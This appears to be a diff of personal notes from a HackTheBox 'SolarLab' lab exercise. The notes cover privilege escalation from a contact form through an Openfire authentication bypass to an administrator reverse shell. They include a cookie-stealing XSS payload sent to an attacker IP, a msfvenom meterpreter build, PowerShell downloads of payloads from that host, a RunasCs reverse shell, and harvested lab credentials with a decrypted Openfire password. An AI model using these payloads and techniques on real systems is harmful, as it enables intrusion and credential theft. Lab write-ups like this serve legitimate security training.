@@ -47,8 +47,9 @@ smb: \> ls
 -[+] : can't bruteforce site goes down just after dirbusting 
 
 -[+] : No xss in contact form for some stolen cookied , checked again 
-
-<img src=x onerror=fetch("http://10.10.14.39:8001"+document.cookie);>
+```xss test
+	<img src=x onerror=fetch("http://10.10.14.39:8001"+document.cookie);>
+```
 ## Dev password on port 6791 
 
 -[+] : details-file.xlsx  -> AlexanderK is a valid user so I figured its same structure for other users -> BlakeB:ThisCanB3typedeasily1@
@@ -106,7 +107,7 @@ Desktops
 
 -[+] : Chisel port 9090
 
-Chisel on windows build .exe : 
+-[+] : Chisel on windows build .exe : 
 ```parrot
 	sudo GOOS=windows GOARCH=amd64 go build main.go
 ```
@@ -120,17 +121,43 @@ Chisel on windows build .exe :
 
 		just follow the https://github.com/miko550/CVE-2023-32315
 
-User added successfully: url: http://127.0.0.1:9090 username: p25z5k password: knblk3
+-[+] : User added successfully: url: http://127.0.0.1:9090 username: p25z5k password: knblk
 
-Follow the git to leverage to openfire user through powershell revshell again 
+-[+] : authentication bypass successful and revshell in openfire user 
 
-PS C:\Program Files\Openfire\embedded-db> cat openfire.script -> contains some passwords ... Im done 4 today 
+-[+] : Follow the git to leverage to openfire user through powershell revshell again 
+
+## Openfire User Recon :
+-[+] : PS C:\Program Files\Openfire\embedded-db> cat openfire.script -> contains some passwords ... Im done 4 today 
+
+-[+] : found sql statements in openfire.script in embedded-db file 
+
+```table structure
+		CREATE MEMORY TABLE PUBLIC.OFUSER(USERNAME VARCHAR(64) NOT NULL,STOREDKEY VARCHAR(32),SERVERKEY VARCHAR(32),SALT VARCHAR(32),ITERATIONS INTEGER,PLAINPASSWORD VARCHAR(32),ENCRYPTEDPASSWORD VARCHAR(255),NAME VARCHAR(100),EMAIL VARCHAR(100),CREATIONDATE VARCHAR(15) NOT NULL,MODIFICATIONDATE VARCHAR(15) NOT NULL,CONSTRAINT OFUSER_PK PRIMARY KEY(USERNAME))
+```
+
+```the insert statement 
+		INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0')
+```
+-[+] : passwordkey : hGXiFzsKaAeYLjn
+
+		┌─[✗]─[parrot@parrot]─[~/Desktop/HackingLab/HackTheBox/Machines/SolarLab/exploit/openfire-password-decrypter]
+		└──╼ $python3 decrypter.py becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn
+		Decrypted password: ThisPasswordShouldDo!@
 
 
 
+-[+] : stable revshell again
+Invoke-WebRequest -Uri http://10.10.14.39:8000/reverse_openfire.exe -UseBasicParsing -o reverse_openfire.exe
 
-		
- 
+-[+] : msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.39 LPORT=6789 -f exe -o reverse_openfire.exe
 
+-[+] : Invoke-WebRequest -Uri http://10.10.14.39:8000/RunasCs.exe -UseBasicParsing -o RunasCs.exe
 
+-[+] : last revshell for admin with runascs.exe :
 
+```powershell
+	runascs.exe user password powershell -r $ip:$port  
+```
+
+CONGRATS WE ADMIN , Nice machine ! I need to play more windows machine to be smoother 
